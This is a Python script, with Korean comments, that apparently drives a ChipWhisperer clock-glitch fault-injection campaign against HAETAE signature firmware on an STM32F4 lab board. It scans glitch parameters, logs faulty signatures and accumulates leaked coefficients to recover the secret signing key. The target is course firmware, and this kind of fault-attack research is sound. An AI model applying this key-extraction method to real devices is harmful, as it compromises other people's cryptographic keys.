# -*- coding: utf-8 -*-
# T2 파라미터 탐색 닫힌-루프 드라이버 (독립 실행, aifia). 노트북 EXP7 셋업 복제.
# config(JSON)로 ext/width/offset 범위·N·모드를 받아 스캔 → 부분누설(clean_coef) 측정 →
# 결과를 CSV/JSON/pickle 로 저장. 매 실행은 fresh 프로세스라 setup+flash+WIN+z1_normal 재수행.
import sys, os, json, time, struct, csv, random, pickle, collections

SCR   = r'C:/Users/NSRSGW/AppData/Local/Temp/claude/c--Users-NSRSGW-ChipWhisperer-chipwhisperer-jupyter-courses-fault-haetae-cm/1435f265-0484-41f5-89af-52c38ea86772/scratchpad'
NBDIR = r'c:/Users/NSRSGW/ChipWhisperer/chipwhisperer/jupyter/courses/fault_haetae_cm'
FW    = r'c:/Users/NSRSGW/ChipWhisperer/chipwhisperer/firmware/mcu/simpleserial-haetae/'
sys.path.insert(0, NBDIR)
import haetae_recover as H
from haetae_recover import partial_coeffs, PartialAccumulator, read_z1raw, read_cpoly, read_s1ntt

CFG = json.load(open(os.path.join(SCR, 't2_config.json'), encoding='utf-8'))
LOG_CSV = os.path.join(SCR, 't2_log.csv')
ACC_PKL = os.path.join(SCR, 't2_acc.pkl')
SUM_JSON= os.path.join(SCR, 't2_summary.json')

PLATFORM='CW308_STM32F4'
GOLDEN  = bytes.fromhex('ba9f152c607b207fc6512635ba11388c')
LEAK_T2 = bytes.fromhex('63ff5ebfaa6263739651890939cccb48')
FL = {'NONE':0,'SEED':1,'SIGNBIT':2,'UNPACK':3,'LSB':4,'CS':5,'ADDY':6,'REJECT':7}
TRIG_POINT = FL['ADDY']
SIGN_MS = 15000

import chipwhisperer as cw
import logging; logging.getLogger('ChipWhisperer').setLevel(logging.ERROR)

# ---------- setup (Setup_Generic + EXP7-a 복제) ----------
scope = cw.scope(name='Husky')
target = cw.target(scope, cw.targets.SimpleSerial)
prog = cw.programmers.STM32FProgrammer
scope.default_setup()
def reset_target(scope):
    scope.io.nrst='low'; time.sleep(0.05); scope.io.nrst='high_z'; time.sleep(0.05)

scope.clock.clkgen_freq=7.37e6; scope.clock.adc_mul=1; scope.io.hs2='clkgen'; time.sleep(0.2)

def ss_echo(t=3000):
    target.flush(); target.simpleserial_write('e', bytearray())
    r=target.simpleserial_read('r',16,timeout=t); return bytes(r) if r else None
def ss_sign(t=90000):
    target.flush(); target.simpleserial_write('p', bytearray([0]*16))
    r=target.simpleserial_read('r',16,timeout=t); return bytes(r) if r else None
def set_fault(line,os_=0,cs=0):
    target.flush(); target.simpleserial_write('f', bytes([line,os_,cs]))
    return target.simpleserial_read('r',1,timeout=3000)
def ss_trig(pt):
    target.flush(); target.simpleserial_write('T', bytes([pt]))
    return target.simpleserial_read('r',1,timeout=3000)
def flash(hexname):
    cw.program_target(scope, prog, FW+hexname); reset_target(scope); time.sleep(0.5); target.flush()
def recover_target():
    reset_target(scope); time.sleep(0.5); target.flush()
    try: ss_trig(TRIG_POINT)
    except Exception: pass
def set_glitch(d,w,o):
    scope.glitch.ext_offset=int(d); scope.glitch.width=int(w); scope.glitch.offset=int(o)
def glitch_once(read_timeout=SIGN_MS):
    if scope.adc.state: recover_target()
    scope.arm(); target.flush(); target.simpleserial_write('p', bytearray([0]*16))
    r=target.simpleserial_read_witherrors('r',16, timeout=read_timeout, glitch_timeout=1500)
    try: scope.capture()
    except Exception: pass
    if (not r['valid']) or r['payload'] is None:
        if ss_echo(800) is None: recover_target()
        else: target.flush()
        return 'mute', None
    p=bytes(r['payload'])
    return ('normal',p) if p==GOLDEN else (('success',p) if p==LEAK_T2 else ('other',p))

# flash baseline + GOLDEN + WIN + glitch mode + z1_normal
scope.io.hs2='clkgen'
flash('haetae-baseline-FSIM-{}.hex'.format(PLATFORM)); set_fault(FL['NONE'],0,0)
g=ss_sign(); assert g==GOLDEN, 'GOLDEN mismatch: %r'%(g,)
ss_trig(TRIG_POINT)
scope.adc.basic_mode='rising_edge'
try: scope.trigger.triggers='tio4'
except Exception: pass
scope.adc.timeout=12
scope.arm(); target.simpleserial_write('p', bytearray([0]*16)); scope.capture()
WIN=int(scope.adc.trig_count); target.simpleserial_read('r',16,timeout=20000)
scope.glitch.enabled=True; scope.glitch.clk_src='pll'; scope.glitch.output='clock_xor'
scope.glitch.trigger_src='ext_single'; scope.glitch.repeat=1
scope.io.hs2='glitch'; scope.adc.timeout=3
time.sleep(0.2); reset_target(scope); time.sleep(0.5); target.flush(); ss_trig(TRIG_POINT)
scope.glitch.repeat=1; ss_sign()
z1n=read_z1raw(target); cpoly=read_cpoly(target); s1true=read_s1ntt(target)
print('SETUP ok | GOLDEN | WIN=%d | PSS=%d'%(WIN, scope.glitch.phase_shift_steps), flush=True)

# ---------- accumulator ----------
if CFG.get('reset_acc') or not os.path.exists(ACC_PKL):
    acc=PartialAccumulator(cpoly, z1_normal=z1n)
else:
    acc=pickle.load(open(ACC_PKL,'rb'))

# ---------- search ----------
N=int(CFG['N']); mode=CFG.get('ext_mode','random')
elo,ehi=int(CFG['ext_lo']),int(CFG.get('ext_hi',WIN))
wlo,whi=int(CFG['w_lo']),int(CFG['w_hi']); olo,ohi=int(CFG['o_lo']),int(CFG['o_hi'])
reps=CFG.get('rep_pool',[1,1,2])
ehi=min(ehi,WIN if WIN>0 else ehi)

cnt=collections.OrderedDict(golden=0,success=0,faulty=0,mute=0)
best_cc=0; best_row=None; leak_rows=[]
PROG=os.path.join(SCR,'t2_progress.txt')
run=CFG.get('run_id','?')
newlog = not os.path.exists(LOG_CSV)
logf=open(LOG_CSV,'a',newline=''); logw=csv.writer(logf)
if newlog: logw.writerow(['run','ext','width','offset','rep','class','clean_coef','digest']); logf.flush()
t0=time.time()
for i in range(N):
    e = int(elo + (ehi-elo)*i/max(N-1,1)) if mode=='sweep' else random.randint(elo,ehi)
    w=random.randint(wlo,whi); o=random.randint(olo,ohi); rep=random.choice(reps)
    set_glitch(e,w,o); scope.glitch.repeat=int(rep)
    g,p=glitch_once()
    cls = 'golden' if g=='normal' else g
    cc=0
    if p is not None and p!=GOLDEN:            # accepted fault
        try:
            z1=read_z1raw(target); cc=len(partial_coeffs(z1,z1n)); acc.add(z1)
        except Exception:
            cc=-1
        if cc>best_cc: best_cc=cc; best_row=(e,w,o,rep,cc)
        if cc>0: leak_rows.append((e,w,o,rep,cc))
    cnt[cls]=cnt.get(cls,0)+1
    logw.writerow([run,e,w,o,rep,cls,cc, p.hex() if p else '']); logf.flush()
    cov=acc.coverage(); sec=sum(cov[1:])
    with open(PROG,'w',encoding='utf-8') as pf:
        pf.write('run=%s shot=%d/%d elapsed=%ds\ncounts=%s\nbest_clean_coef=%d best_param=%s\nsecret_cov=%d/768 (%.1f%%) sign=%s\nleaks=%s\n'%(
            run,i+1,N,int(time.time()-t0),dict(cnt),best_cc,best_row,sec,100*sec/768,acc.sign,leak_rows[-8:]))
    if (i+1)%10==0:
        try: pickle.dump(acc,open(ACC_PKL,'wb'))
        except Exception: pass
logf.close(); scope.glitch.repeat=1
dur=time.time()-t0

cov=acc.coverage(); sec=sum(cov[1:])
res=acc.recover(true_s1ntt=s1true)
summary={
 'run':CFG.get('run_id','?'), 'N':N, 'mode':mode,
 'ext':[elo,ehi],'w':[wlo,whi],'o':[olo,ohi],'reps':reps,
 'dur_s':round(dur,1),'per_shot_s':round(dur/max(N,1),2),
 'counts':dict(cnt),
 'best_clean_coef':best_cc,'best_param':best_row,
 'leak_params':leak_rows[:20],
 'coverage':cov,'secret_cov':sec,'secret_pct':round(100*sec/768,1),
 'sign':acc.sign,'acc_n':acc.n_add,
 'full_recovery': res.get('agreement'),
}
json.dump(summary, open(SUM_JSON,'w',encoding='utf-8'), ensure_ascii=False, indent=1)
try: scope.dis()
except Exception: pass
print('RESULT', json.dumps(summary, ensure_ascii=False), flush=True)
